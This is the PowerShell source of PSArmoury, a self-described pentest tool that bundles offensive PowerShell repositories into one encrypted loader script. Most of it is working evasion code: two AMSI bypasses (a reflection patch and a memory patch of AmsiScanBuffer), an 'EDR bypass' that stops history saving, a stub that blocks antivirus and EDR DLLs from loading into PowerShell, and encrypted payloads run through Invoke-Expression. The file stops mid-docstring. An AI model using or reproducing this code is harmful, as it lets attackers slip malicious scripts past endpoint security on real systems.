function New-PSArmoury
{
<#
.SYNOPSIS

New-PSArmoury creates a single, encrypted file (your armoury) containing all your favourite PowerShell scripts from multiple repositories based on a config file.

Basically it's like "apt-get update" for your offensive PowerShell arsenal.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

The PowerShell Armoury is ment for Pentesters or Auditors who use a variety of PowerShell tools during their engagements. It allows you to download and store all of your favourite PowerShell scripts in a single, encrypted file.

You don't have to hassle with updating nishang, powersploit,.. manually. Just create a configuration file once or use the default one included with the tool. From now on, you just have to run "New-PSArmoury" before you head to the next pentest.

In addition, your new and shiny armoury is encrypted and includes a bypass for AMSI, so you dont have to worry about AV.

Note that you have to provide a valid github account as well as a personal access token, so the script can properly use the github API.

.PARAMETER Path

The path to your new armoury file. The default ist ".\MyArmoury.ps1"

.PARAMETER FromFile

Load your Powershell scripts directly from a local folder or file and you don't have to provide a config file.

.PARAMETER Config

The path to your JSON-config file. Have a look at the sample that comes with this script for ideas.

.PARAMETER Password

The password that will be used to encrypt your armoury. If you do not provide a password, the script will generate a random one.

Please note: the main goal of encryption in this script is to circumvent anti-virus. If confidentiality is important to you, use the "-OmitPassword" switch. Otherwise your password and salt will be stored in your armoury in PLAINTEXT!

.PARAMETER Salt

The salt that will be used together with your password to generate an AES encryption key. If you do not provide a salt, the script will generate a random one.

Please note: the main goal of encryption in this script is to circumvent anti-virus. If confidentiality is important to you, use the "-OmitPassword" switch. Otherwise your password and salt will be stored in your armoury in PLAINTEXT!

.PARAMETER OmitPassword

This switch will remove the plaintext password from the final armoury script. Use this if confidentiality is important to you.

.PARAMETER ValidateOnly

Use this together with "-Config" to let the script validate the basic syntax of your JSON config file without executing it.

.PARAMETER Use3DES

Encrypts with 3DES instead of AES.

.PARAMETER EnhancedArmour

Instructs your armoury to require a protectecd PowerShell process. Therefore on first execution, your armoury will not load but spawn a new PowerShell that is set to run with BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON process mitigation.
This prevents non-microsoft DLLs (e.g. AV/EDR products) to load into PowerShell.
Shamelessly copied from the great example of @_rastamouse: https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Password Hugo123!

Description
-----------

This will read the config file from the current directory using ".\MyArmoury.json" and create an encrypted armoury using the password "Hugo123!". Since to path argument has been supplied, the output file will be stored under ".\MyArmoury.ps1".

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Password Hugo123! -OmitPassword

Description
-----------

Same as the previous example but the cleartext password will not be stored in the armoury. Beware that you have to put it there before you can execute your armoury. Use this if confidentiality is important to you.

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Path C:\temp\MyFancyNewArmoury.ps1

Description
-----------

This will read the config file from the current directory using ".\MyArmoury.json" and create an encrypted armoury using a randomly generated password since no password was supplied. The output will be stored at "C:\temp\MyFancyNewArmoury.ps1".

.EXAMPLE

New-PsArmoury -FromFile .\myfolderfullofps1scripts\

Description
-----------

Loads all ps1 files from the given folder into your armoury without requiring a config file.

.EXAMPLE

New-PsArmoury -Config .\MyArmoury.json -Path C:\temp\MyFancyArmoury.ps1 -EnhancedArmour

Description
-----------

Creates armoury based on MyArmoury.json as previous examples but will use BlockDLL process mitigiation. (see parameter description)

.LINK

https://github.com/cfalta/PowerShellArmoury

#>
[CmdletBinding()]
    Param (
        [Parameter(Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Path=".\MyArmoury.ps1",

        [Parameter(Mandatory = $False)]
        [ValidateScript({Test-Path $_})]
        [String]
        $FromFile,

        [Parameter(Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Config,

        [Parameter(Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt,

        [Parameter(Mandatory = $False)]
        [Switch]
        $OmitPassword,

        [Parameter(Mandatory = $False)]
        [Switch]
        $ValidateOnly,

        [Parameter(Mandatory = $False)]
        [Switch]
        $Use3DES,

        [Parameter(Mandatory = $False)]
        [Switch]
        $EnhancedArmour
    )

function Test-PSAConfig
{
    if($global:PSArmouryConfig)
    {
        $Index = 0
        foreach($Item in $global:PSArmouryConfig)
        {
            if(-Not($Item.Name -and $Item.Type -and $Item.URL))
            {
                Write-Warning ("PSArmoury: error validating item at index " + $Index + ". Name, Type and URL are mandatory.")
            }

            if(-Not(($Item.Type -eq "GitHubRepo") -or ($Item.Type -eq "GitHubItem") -or ($Item.Type -eq "WebDownloadSimple")))
            {
                Write-Warning ("PSArmoury: error validating item at index " + $Index + ". Type needs to be either GitHubRepo, GitHubItem or WebDownloadSimple")
            }

            $Index++
        }
    }    
}

function Disable-AMSI
{
    try
    {
        #AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
        (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
    }
    catch
    {
        Write-Warning "PSArmoury: Warning - AMSI bypass failed. Beware of errors due to AV detection."
    }
}

function Get-Password([int]$Length)
{
    if($Length -gt 0)
    {
        $Alphabet = @("0","1","2","3","4","5","6","7","8","9",":",";","<","=",">","?","!","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","_","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z")
        
        for($i=1;$i -le $Length;$i++)
        {
            $Password += $Alphabet | Get-Random    
        }

        return($Password)
    }
}

function Write-LoaderFile($EncryptedScriptFileObjects)
{

#Shamelessly copied from the great example of @_rastamouse: https://gist.github.com/rasta-mouse/af009f49229c856dc26e3a243db185ec
$DLLMitigationPolicy=@"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    
    namespace PSSecure
    {
        public class Program
        {
            public static void Main(string[] args)
            {
                var startInfoEx = new Win32.STARTUPINFOEX();
                var processInfo = new Win32.PROCESS_INFORMATION();
                
                startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);
    
                var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
    
                try
                {
                    var processSecurity = new Win32.SECURITY_ATTRIBUTES();
                    var threadSecurity = new Win32.SECURITY_ATTRIBUTES();
                    processSecurity.nLength = Marshal.SizeOf(processSecurity);
                    threadSecurity.nLength = Marshal.SizeOf(threadSecurity);
    
                    var lpSize = IntPtr.Zero;
                    Win32.InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                    startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    Win32.InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
    
                    Marshal.WriteIntPtr(lpValue, new IntPtr((long)Win32.BinarySignaturePolicy.BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON));
    
                    Win32.UpdateProcThreadAttribute(
                        startInfoEx.lpAttributeList,
                        0,
                        (IntPtr)Win32.ProcThreadAttribute.MITIGATION_POLICY,
                        lpValue,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero
                        );
    
                    Win32.CreateProcess(
                        args[0],
                        null,
                        ref processSecurity,
                        ref threadSecurity,
                        false,
                        Win32.CreationFlags.ExtendedStartupInfoPresent | Win32.CreationFlags.CreateNewConsole,
                        IntPtr.Zero,
                        null,
                        ref startInfoEx,
                        out processInfo
                        );
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine(e.StackTrace);
                }
                finally
                {
                    Win32.DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(lpValue);
    
                    Console.WriteLine("New PowerShell with PID {0} started.", processInfo.dwProcessId);
                }
            }
        }
    
        class Win32
        {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
    
            [DllImport("kernel32.dll")]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
    
            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            public struct STARTUPINFO
            {
                public uint cb;
                public IntPtr lpReserved;
                public IntPtr lpDesktop;
                public IntPtr lpTitle;
                public uint dwX;
                public uint dwY;
                public uint dwXSize;
                public uint dwYSize;
                public uint dwXCountChars;
                public uint dwYCountChars;
                public uint dwFillAttributes;
                public uint dwFlags;
                public ushort wShowWindow;
                public ushort cbReserved;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdErr;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            public struct STARTUPINFOEX
            {
                public STARTUPINFO StartupInfo;
                public IntPtr lpAttributeList;
            }
    
            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public int bInheritHandle;
            }
    
            [Flags]
            public enum ProcThreadAttribute : int
            {
                MITIGATION_POLICY = 0x20007,
                PARENT_PROCESS = 0x00020000
            }
    
            [Flags]
            public enum BinarySignaturePolicy : ulong
            {
                BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000,
                BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x300000000000
            }
    
            [Flags]
            public enum CreationFlags : uint
            {
                CreateSuspended = 0x00000004,
                DetachedProcess = 0x00000008,
                CreateNoWindow = 0x08000000,
                ExtendedStartupInfoPresent = 0x00080000,
                CreateNewConsole = 0x00000010
            }
        }
    }
"@

$DLLMitigationPolicyEncoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($DLLMitigationPolicy))
$DecisionMarker = Get-Random

$BlockDLLStubPrefix = @"
if(`$env:$DecisionMarker)
{
"@
$BlockDLLStubSuffix = @"
}
else
{
Write-Output "PSArmoury: Your armoury is set to run with enhanced process mitigation policy. This will block any Non-Microsoft DLLs (e.g. AV) from running inside PowerShell."
Write-Output "PSArmoury: We will now spawn a new, protected PowerShell process. You have to load your armoury manually in there again to continue."
Write-Output "PSArmoury: Press any key to continue..."
`$null = Read-Host
`$env:$DecisionMarker = `$true
`$TypeDefEncoded = "$DLLMitigationPolicyEncoded"
`$TypeDef = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$TypeDefEncoded))
Add-Type -TypeDefinition `$TypeDef
[PSSecure.Program]::Main("C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe")
}
"@

$AMSIBypass2=@"
using System;
using System.Runtime.InteropServices;

namespace RandomNamespace
{
    public class RandomClass
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void RandomFunction()
        {
            IntPtr TargetDLL = LoadLibrary("amsi.dll");
            IntPtr TotallyNotThatBufferYouRLookingForPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");

            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
         
            VirtualProtect(TotallyNotThatBufferYouRLookingForPtr, dwSize, 0x40, out Zero);
            Byte[] one = { 0x31 };
            Byte[] two = { 0xff, 0x90 };
            int length = one.Length + two.Length;
            byte[] sum = new byte[length];
            one.CopyTo(sum,0);
            two.CopyTo(sum,one.Length);
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
             Marshal.Copy(sum, 0, unmanagedPointer, 3);
             MoveMemory(TotallyNotThatBufferYouRLookingForPtr + 0x001b, unmanagedPointer, 3);
        }
    }
}
"@
$AMSIBypass2encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($AMSIBypass2))

$BypassStub=@"
#EDR Bypass
Set-PSReadlineOption -HistorySaveStyle SaveNothing

#AMSI Bypass by Matthew Graeber - altered a bit because Windows Defender now has a signature for the original one
(([Ref].Assembly.gettypes() | where {`$_.Name -like "Amsi*tils"}).GetFields("NonPublic,Static") | where {`$_.Name -like "amsiInit*ailed"}).SetValue(`$null,`$true)

#AMSI Bypass 2
`$AMSIBypass2encoded = "$AMSIBypass2encoded"
`$AMSIBypass2 = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(`$AMSIBypass2encoded))
Add-Type -TypeDefinition `$AMSIBypass2
[RandomNamespace.RandomClass]::RandomFunction()
"@

if($global:3DES)
{

#This is the decryption stub used in the loader file
$DecryptionStub=@"
if(`$Password -and `$Salt)
{
`$Index = 0
foreach(`$ef in `$EncryptedFunctions)
{

[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])

`$3DES = [System.Security.Cryptography.TripleDESCryptoServiceProvider]::Create()
`$3DES.Mode = [System.Security.Cryptography.CipherMode]::CBC

`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA1",5)

`$3DES.Padding = "PKCS7"
`$3DES.KeySize = 128
`$3DES.Key = `$Key.GetBytes(16)
`$3DES.IV = `$InitVector

`$3DESDecryptor = `$3DES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$3DESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$3DES.Clear()

try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading function number `$Index. Beware that this only affects the mentioned function so everything else should work fine." }

`$Index++
}
}
"@
}
else {
    
#This is the decryption stub used in the loader file
$DecryptionStub=@"
if(`$Password -and `$Salt)
{
`$Index = 0
foreach(`$ef in `$EncryptedFunctions)
{

[byte[]]`$CipherText = [Convert]::FromBase64String(`$ef[1])
[byte[]]`$InitVector = [Convert]::FromBase64String(`$ef[0])

`$AES = [System.Security.Cryptography.Aes]::Create()

`$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes(`$Password),[Text.Encoding]::ASCII.GetBytes(`$Salt),"SHA256",5)

`$AES.Padding = "PKCS7"
`$AES.KeySize = 256
`$AES.Key = `$Key.GetBytes(32)
`$AES.IV = `$InitVector

`$AESDecryptor = `$AES.CreateDecryptor()

`$MemoryStream = New-Object System.IO.MemoryStream(`$CipherText,`$True)
`$CryptoStream = New-Object System.Security.Cryptography.CryptoStream(`$MemoryStream,`$AESDecryptor,[System.Security.Cryptography.CryptoStreamMode]::Read)
`$StreamReader = New-Object System.IO.StreamReader(`$CryptoStream)

`$Message = `$StreamReader.ReadToEnd()

`$CryptoStream.Close()
`$MemoryStream.Close()
`$AES.Clear()

try {`$Message | Invoke-Expression } catch { Write-Warning "Error loading function number `$Index. Beware that this only affects the mentioned function so everything else should work fine." }

`$Index++
}
}
"@
}
    #Delete the outputfile if it exists

    if((Test-Path -LiteralPath $Path))
    {
        Remove-Item -LiteralPath $Path -Force
    }

    #Creates a string array of encrypted scripts, which will be included in the decryption stub defined above
    $SummaryArrayDefinition = '$EncryptedFunctions = @('

    foreach($EncScript in $EncryptedScriptFileObjects)
    {
        $SingleArrayDefinition = ($EncScript.ID + ' = (' + '"' + $EncScript.IV + '", "' + $EncScript.Ciphertext + '")')
   
        $SummaryArrayDefinition += ($EncScript.ID + ",")

        Add-Content $Path $SingleArrayDefinition
    }

    $SummaryArrayDefinition = $SummaryArrayDefinition.TrimEnd(",")
    $SummaryArrayDefinition += ")"

    #Write the string array into the loader file
    Add-Content $Path $SummaryArrayDefinition

    #Check if the "OmitPassword" switch has been set and either included the cleartext password in the script or insert a placeholder
    if($OmitPassword)
    {
        $PasswordInFile = "<INSERT-PASSWORD-HERE>"
    }
    else
    {
        $PasswordInFile = $Password
    }
    
    $SaltInFile = $Salt

    $PasswordDefiniton = ('$Password="' + $PasswordInFile + '"')
    $SaltDefiniton = ('$Salt="' + $SaltInFile + '"')

    #Write password, salt, detection bypass and decryption stub to the loader file; Optionally add stub for blocking non MS DLLs 
    Add-Content $Path $PasswordDefiniton
    Add-Content $Path $SaltDefiniton
    Add-Content $Path $BypassStub
    if($EnhancedArmour){Add-Content $Path $BlockDLLStubPrefix}
    Add-Content $Path $DecryptionStub
    if($EnhancedArmour){Add-Content $Path $BlockDLLStubSuffix}

}

function Invoke-GithubAPI
{
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $true)]
        [ValidateSet("Get","Post")]
        [String]
        $Method,
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $URI)

#Create authorization header manually cause -Authentication param is not supported in earlier PS versions
$CredentialsBase64 = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes(($global:GitHubCredentials.Username + ":" + $global:GitHubCredentials.GetNetworkCredential().Password)))
$BasicAuthHeader = ("Basic " + $CredentialsBase64)

$Params = @{
    'Method'        = $Method
    'URI'           = $URI
    'Headers'       = @{ "User-Agent" = "TotallyLegit"; "Authorization"=$BasicAuthHeader}
    'Verbose'       = $False
}       

$Response = Invoke-RestMethod @Params

$Response

}

function Get-PSAGitHubRepo([string]$Name)
{
    $PSA = $global:PSArmouryConfig | ? {$_.Name -eq $Name}
    $BaseURL = $PSA.URL
    
    $Response = Invoke-GithubAPI -Method Get -URI $BaseURL
    
    if($PSA.Branch)
    {
        $ContentURL = $Response.contents_url.Substring(0,$Response.contents_url.LastIndexOf("/")) + "?ref=" + $PSA.Branch
    }
    else {
        $ContentURL = $Response.contents_url.Substring(0,$Response.contents_url.LastIndexOf("/"))
    }

    $ContentIndex = Invoke-GithubAPI -Method Get -URI $ContentURL

    $NewItem = $True

    #Discover all files in the repository and download them
    while($NewItem)
    {
        $NewItem = $False
        $ContentIndex2 = @()

        foreach($ContentItem in $ContentIndex)
        {
            if($ContentItem.type -eq "dir")
            {
                $ContentIndex2 += (Invoke-GithubAPI -Method Get -URI $ContentItem.URL)
                
                $NewItem = $True
            }

            if($ContentItem.type -eq "file")
            {
                $Include = $True

                if(($PSA.FileExclusionFilter))
                {                
                    foreach($f in $PSA.FileExclusionFilter)
                    { 
                        if($ContentItem.Name -like $f)
                        {
                            $Include = $False
                        }
                    }
                }
                if(($PSA.FileInclusionFilter))
                {
                    foreach($f in $PSA.FileInclusionFilter)
                    { 
                        if($ContentItem.Name -notlike $f)
                        {
                            $Include = $False
                        }
                    }
                }

                if($Include)
                {
                    Write-Verbose ("PSArmoury: trying to download " + $PSA.Name + "/" + $ContentItem.Name)
                                       
                    try
                    {
                        $Response = Invoke-GithubAPI -Method Get -URI $ContentItem.download_url

                        $PSO = New-Object -TypeName PSObject
                        $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
                        $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $ContentItem.Name
                        $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Response

                        $global:PSAInventory += $PSO
                    }
                    catch
                    {
                        Write-Warning ("PSArmoury: error while downloading " + $PSA.Name + "/" + $ContentItem.Name)
                    }           
                }
            }
        }

        $ContentIndex = $ContentIndex2
    }

}

function Get-PSALocalFile([string]$Name)
{
    $PSA = $global:PSArmouryConfig | ? {$_.Name -eq $Name}
    if(Test-Path $PSA.URL)
    {
        if((Get-Item -LiteralPath $PSA.URL).PSISContainer)
        {
            $Files = Get-Childitem -LiteralPath $PSA.URL -Filter *.ps1
        }
        else 
        {
            $Files = Get-Item -LiteralPath $PSA.URL         
        }

        foreach($f in $Files)
        {
            $PSO = New-Object -TypeName PSObject
            $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
            $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $f.name
            $PSO | Add-Member -MemberType NoteProperty -Name Code -Value (get-content -raw $f.fullname)
    
            $global:PSAInventory += $PSO
        }

    }
    else {
        Write-Warning ("PSArmoury: error while reading local file " + $PSA.URL)
    }
}

function Get-PSASimpleWebDownload([string]$Name)
{
    $PSA = $global:PSArmouryConfig | ? {$_.Name -eq $Name}
    $BaseURL = $PSA.URL
    $ItemName = $BaseURL.Substring($BaseURL.LastIndexOf("/")+1)
 
    if($PSA.Type -eq "GitHubItem")
    {
        try
        {
            $Response = Invoke-GithubAPI -Method Get -URI $BaseURL

            $PSO = New-Object -TypeName PSObject
            $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
            $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $ItemName
            $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Response
    
            $global:PSAInventory += $PSO
        }
        catch
        {
            Write-Warning ("PSArmoury: error while downloading " + $PSA.Name + "/" + $ItemName)
        }
    }
    else 
    { 
        try
        {
            $Response = Invoke-RestMethod -Method Get -Uri $BaseURL -Verbose:$false

            $PSO = New-Object -TypeName PSObject
            $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value $PSA.Name
            $PSO | Add-Member -MemberType NoteProperty -Name Name -Value $ItemName
            $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Response

            $global:PSAInventory += $PSO
        }
        catch
        {
            Write-Warning ("PSArmoury: error while downloading " + $PSA.Name + "/" + $ItemName)
        }
    }

}

function Add-Inventory
{
    $Content = 'function Get-PSArmoury{$i=@('

    foreach($Item in $global:PSAInventory)
    {
        $Content = $Content + '"' + $Item.Name + '",'
    }

    $Content = $Content.Trim(",")
    $Content = $Content + ');$i}'

    $PSO = New-Object -TypeName PSObject
    $PSO | Add-Member -MemberType NoteProperty -Name Repository -Value "Inventory"
    $PSO | Add-Member -MemberType NoteProperty -Name Name -Value "Inventory"
    $PSO | Add-Member -MemberType NoteProperty -Name Code -Value $Content

    $global:PSAInventory += $PSO
}

### MAIN ###

$ScriptRequirements = $True

if($FromFile)
{
    $PSO = New-Object -TypeName PSObject
    $PSO | Add-Member -MemberType NoteProperty -Name "Name" -Value "LocalRepo"
    $PSO | Add-Member -MemberType NoteProperty -Name "Type" -Value "LocalFile"
    $PSO | Add-Member -MemberType NoteProperty -Name "URL" -Value $FromFile

    $global:PSArmouryConfig = @()
    $global:PSArmouryConfig += $PSO
}
else 
{

    if($Config)
    {
        try
        { 
            $global:PSArmouryConfig = Get-Content -Raw $Config | ConvertFrom-Json
            Write-Output "PSArmoury: configuration loaded successfully"
        }
        catch
        {
            Write-Warning "PSArmoury: error while loading configuration file."
            $ScriptRequirements = $False
        }
    }
    else
    {
        Write-Warning "PSArmoury: No configuration file found. Please provide a valid configuration and try again."
        $ScriptRequirements = $False
    }

    if($ValidateOnly)
    {
        Test-PSAConfig
        $ScriptRequirements = $False
    }
}

if($Use3DES)
{
    $global:3DES = $True
}
else {
    $global:3DES = $False
}

if($ScriptRequirements)
{

    Write-Output ("PSArmoury: your armoury contains " + $PSArmouryConfig.count + " repositories. Starting to process.")

    $global:PSAInventory = @()
    $global:GitHubCredentials = $null

	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	
    foreach($PSA in $PSArmouryConfig)
    {
        switch($PSA.Type)
        {
            GitHubRepo{

                if(-Not $global:GitHubCredentials)
                {
                    $global:GitHubCredentials = Get-Credential -Message "Please enter Github username and access token"
                }

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSAGitHubRepo($PSA.Name)

            }

            GitHubItem{

                if(-Not $global:GitHubCredentials)
                {
                    $global:GitHubCredentials = Get-Credential -Message "Please enter Github username and access token"
                }

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSASimpleWebDownload($PSA.Name)

            }

            WebDownloadSimple{

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSASimpleWebDownload($PSA.Name)

            }

            LocalFile{

                Write-Output ("PSArmoury: processing repository " + $PSA.Name)
                Get-PSALocalFile($PSA.Name)

            }

            default{

            }
        }
    }

    Write-Output "PSArmoury: download complete, starting encryption"

    if($global:PSAInventory)
    {

        Add-Inventory

        $Identifier = 0
        $PSACryptoInventory = @()

        if(-Not $Password)
        {
            Write-Output "PSArmoury: you did not supply a password, so we will generate a random one. You might want to write that down."
            
            $Password = Get-Password -Length 10
            
            Write-Output ("PSArmoury: your password is " + $Password)

        }
        if(-Not $Salt)
        {
            $Salt = Get-Password -Length 10
        }


        foreach($Item in $global:PSAInventory)
        {
            if($global:3DES)
            {
                $Crypt = Get-3DESEncrypt -Message $Item.Code -Password $Password -Salt $Salt
            }
            else {
                $Crypt = Get-AESEncrypt -Message $Item.Code -Password $Password -Salt $Salt               
            }


            $EncryptedScriptFileObject = New-Object -TypeName PSObject
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "ID" -Value ('$EncFunc' + $Identifier)
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value $Crypt.Ciphertext
            $EncryptedScriptFileObject | Add-Member -MemberType NoteProperty -Name "IV" -Value $Crypt.IV

            $PSACryptoInventory += $EncryptedScriptFileObject

            $Identifier++

        }

        Write-Output "PSArmoury: script processing complete, creating armoury. Happy hacking :-)"

        Write-LoaderFile($PSACryptoInventory)
    }
    else
    {
        Write-Output "Your armoury seems to be empty. Check your config file."   
    }
}
}

function Get-AESEncrypt
{
<#
.SYNOPSIS

Get-AESEncrypt encrypts a message using AES-256 and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-AESEncrypt encrypts a message using AES-256. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.PARAMETER Salt

The salt used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA256, 5 rounds)

.EXAMPLE

Get-AESEncrypt -Message "Hello World" -Password "P@ssw0rd" -Salt "NotAGoodPassword"

Description
-----------

Encrypts the message "Hello World" and returns the result as a custom psobject.

#>

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullorEmpty()]
        [String]
        $Message,

        [Parameter(Position = 1, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Password,

        [Parameter(Position = 2, Mandatory = $False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Salt
    )

#Create a new instance of the .NET AES provider
$AES = [System.Security.Cryptography.Aes]::Create()

#Derive an encryption key from the password and the salt
$Key = New-Object System.Security.Cryptography.PasswordDeriveBytes([Text.Encoding]::ASCII.GetBytes($Password),[Text.Encoding]::ASCII.GetBytes($Salt),"SHA256",5)

#The AES instance automatically creates an IV. This is stored in a separate variable for later use.
$IV = $AES.IV

#Set the parameters for AES encryption
$AES.Padding = "PKCS7"
$AES.KeySize = 256
$AES.Key = $Key.GetBytes(32)

#Create a new encryptor
$AESCryptor = $AES.CreateEncryptor()

#Create a memory and crypto stream for encryption
$MemoryStream = New-Object System.IO.MemoryStream
$CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemoryStream,$AESCryptor,[System.Security.Cryptography.CryptoStreamMode]::Write)

#Conver the message to a byte array
$MessageBytes = [System.Text.Encoding]::ASCII.GetBytes($Message)

#Encrypt the message using cryptostream
$CryptoStream.Write($MessageBytes,0,$MessageBytes.Length)
$CryptoStream.FlushFinalBlock()

#Get the ciphertext as byte array
$CipherText = $MemoryStream.ToArray()

#Free ressources
$CryptoStream.Close()
$MemoryStream.Close()
$AES.Clear()

#Create a custom psobject containing the initialization vector and the ciphertext
$CryptoResult = New-Object -TypeName PSObject
$CryptoResult | Add-Member -MemberType NoteProperty -Name "IV" -Value ([Convert]::ToBase64String($IV))
$CryptoResult | Add-Member -MemberType NoteProperty -Name "Ciphertext" -Value ([Convert]::ToBase64String($CipherText))

return($CryptoResult)

}

function Get-3DESEncrypt
{
<#
.SYNOPSIS

Get-3DESEncrypt encrypts a message using 3DES and returns the result as a custom psobject.

Author: Christoph Falta (@cfalta)

.DESCRIPTION

Get-3DESEncrypt encrypts a message using 3DES. Only strings are supported for encryption.

.PARAMETER Message

A string containing the secret message.

.PARAMETER Password

The password used for encryption. The encryption key will be derived from the password and the salt via a standard password derivation function. (SHA1, 5 rounds)

.PARAMETER Salt

